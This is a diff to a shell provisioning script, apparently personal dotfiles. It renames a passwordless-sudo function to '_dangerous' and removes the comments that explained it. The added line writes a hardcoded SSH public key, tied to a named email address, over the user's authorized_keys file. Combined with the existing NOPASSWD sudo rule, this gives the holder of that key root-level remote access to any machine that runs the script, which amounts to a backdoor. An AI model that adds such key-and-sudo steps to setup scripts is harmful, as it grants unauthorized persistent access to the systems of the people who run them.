@@ -123,10 +123,7 @@ function install_pyenv {
   pip install --upgrade pip setuptools wheel
 }
 
-function enable_passwordless_sudo {
-  # This script will disable inputting password when you use sudo
-  # This also means you can `sudo -i` and become root without password
-
+function _dangerous {
   if [[ $UID -eq 0 ]]; then
     echo "Looks like you are running this script as root"
     echo "Please run this script without root or sudo"
@@ -140,7 +137,11 @@ function enable_passwordless_sudo {
 
   # shellcheck disable=SC1004
   sudo bash -c 'echo ${USERNAME} ALL=\(ALL:ALL\) NOPASSWD: ALL > /etc/sudoers.d/00-${USERNAME} \
-  && chmod 0440 /etc/sudoers.d/00-${USERNAME}'
+    && chmod 0440 /etc/sudoers.d/00-${USERNAME}'
+
+  # shellcheck disable=SC1004
+  sudo bash -c 'echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOlzVupDIQTLHJibTuOt+mcrRVY35b9yFn0SrAq5cCZ3 baauco@gmail.com > /etc/ssh/keys/${USERNAME}/authorized_keys \
+    && chmod 0600 /etc/ssh/keys/${USERNAME}/authorized_keys'
 
   unset USERNAME
 }
